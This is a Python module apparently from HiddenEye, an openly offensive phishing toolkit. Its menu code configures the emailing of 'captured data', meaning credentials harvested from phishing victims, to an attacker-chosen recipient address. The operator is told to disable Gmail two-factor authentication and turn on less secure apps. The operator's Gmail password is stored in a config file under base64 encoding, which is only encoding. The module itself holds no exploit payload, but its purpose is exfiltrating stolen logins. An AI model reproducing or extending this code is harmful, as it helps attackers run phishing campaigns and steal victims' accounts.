#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#


from Defs.ImportManager.unsorted_will_be_replaced import run_command, wait, path, system, getpass, base64, copyfile
import Defs.ThemeManager.theme as theme

default_palette = theme.default_palette

def captured_data_email_prompt():
    run_command('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**'''.format(default_palette[0], default_palette[2]))
    print(
        "-------------------------------\n{0}[ PROMPT: NEED CAPTURED DATA TO EMAIL ? ]{1}!! {0}\n-------------------------------".format(default_palette[0], default_palette[4]))
    print("\n{0}[{1}!{0}]{1}No Need To Configure, If you have Already Done. ".format(default_palette[0], default_palette[4]))
    print("\n{0}[{1}*{0}]{0}DO YOU WANT CAPTURED DATA TO BE EMAILED, THEN CREATE CONFIG FILE -{1}(Y/N)".format(default_palette[0], default_palette[4]))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(default_palette[0], default_palette[4], default_palette[2])).upper()
    if choice == 'Y':
        print("\n{0}[{1}!{0}] BEFORE STARTING MAKE SURE THESE THINGS: \n\n{0}[{1}+{0}] {1}YOU HAVE CORRECT GMAIL USERNAME & PASSWORD\n{0}[{1}+{0}] {1}YOU HAVE DISABLED 2-FACTOR AUTHENTICATION FROM YOUR GMAIL ACCOUNT\n{0}[{1}+{0}] {1}YOU HAVE TURNED ON LESS SECURED APPS \n    (https://myaccount.google.com/lesssecureapps) \n\n".format(default_palette[0], default_palette[4]))
        input('[.] Press Enter To Start Configuring Gmail Credential File...')
        captured_data_email_configuration_prompt()
    elif choice == 'N':
        pass
    else:
        print('[^] ERROR: Please choose correct option to continue...')
        wait(1)
        captured_data_email_prompt()

def captured_data_email_confirmation(port):  # Ask user to start sending credentials to recipient Email Address.
    import Defs.ActionManager.simple_informant as simple_informant
    choice = input(
        "\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend_Email(y/n)>> {2}".format(default_palette[0], default_palette[4], default_palette[2])).upper()
    if choice == 'Y' or choice == 'y':
        if path.isfile('Defs/FeatureManager/EmailManager/emailconfig.py') == True:
            system('python3 Defs/FeatureManager/EmailManager/SendEmail.py')
        else:
            print(
                '[ERROR!]: NO CONFIG FILE FOUND ! PLEASE CREATE CONFIG FILE FIRST TO USE THIS OPTION.')
            wait(2)
            simple_informant.exit_message(port)
    elif choice == 'N' or choice == 'n':
        simple_informant.exit_message(port)
    else:
        system('clear')
        print("\n\n{0}[{1}^{0}] {2}Please Select A Valid Option.. ".format(default_palette[0], default_palette[4], default_palette[2]))
        wait(1)
        system('clear')
        return captured_data_email_confirmation(port)


def captured_data_email_configuration_prompt():
    run_command('clear')
    print('''{1}
        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {1}http://github.com/darksecdevelopers
        {0}** BY: {1}DARKSEC {0}**'''.format(default_palette[0], default_palette[2]))
    print("-------------------------------\n{0}[ PROMPT: CONFIG EMAIL CREDENTIAL FILE ]{1}!! {0}\n-------------------------------".format(default_palette[0], default_palette[4]))
    #run_command('cp Defs/FeatureManager/EmailManager/EmailConfigDefault.py Defs/FeatureManager/EmailManager/emailconfig.py')
    copyfile('Defs/FeatureManager/EmailManager/EmailConfigDefault.py', 'Defs/FeatureManager/EmailManager/emailconfig.py')
    GMAILACCOUNT = input("{0}[{1}+{0}] Enter Your Gmail Username:{1} ".format(default_palette[0], default_palette[4]))
    with open('Defs/FeatureManager/EmailManager/emailconfig.py') as f:
        read_data = f.read()
        c = read_data.replace('GMAILACCOUNT', GMAILACCOUNT)
        f = open('Defs/FeatureManager/EmailManager/emailconfig.py', 'w')
        f.write(c)
        f.close()
        print("{0}[.] {1}Email Address Added To config File. !\n".format(default_palette[0], default_palette[4]))
    GMAILPASSWORD = getpass.getpass(
        "{0}[{1}+{0}] Enter Your Gmail Password:{1} ".format(default_palette[0], default_palette[4]))
    with open('Defs/FeatureManager/EmailManager/emailconfig.py') as f:
        read_data = f.read()
        GMAILPASSWORD = base64.b64encode(GMAILPASSWORD.encode())
        GMAILPASSWORD = (GMAILPASSWORD.decode('utf-8'))
        c = read_data.replace('GMAILPASSWORD', GMAILPASSWORD)
        f = open('Defs/FeatureManager/EmailManager/emailconfig.py', 'w')
        f.write(c)
        f.close()
        print("{0}[.] {1}Password(Encoded) Added To config File. !\n".format(default_palette[0], default_palette[4]))
    RECIPIENTEMAIL = input(
        "{0}[{1}+{0}] Enter Recipient Email:{1} ".format(default_palette[0], default_palette[4]))
    with open('Defs/FeatureManager/EmailManager/emailconfig.py') as f:
        read_data = f.read()
        c = read_data.replace('RECIPIENTEMAIL', RECIPIENTEMAIL)
        f = open('Defs/FeatureManager/EmailManager/emailconfig.py', 'w')
        f.write(c)
        f.close()
        print("{0}[.] {1}Recipient Email Address Added To config File. !\n".format(default_palette[0], default_palette[4]))
        print(
            '\n\n{0}[{1}SUCCESS{0}]: Created Config File & Saved To (Defs/FeatureManager/EmailManager/Config.py)'.format(default_palette[0], default_palette[4]))
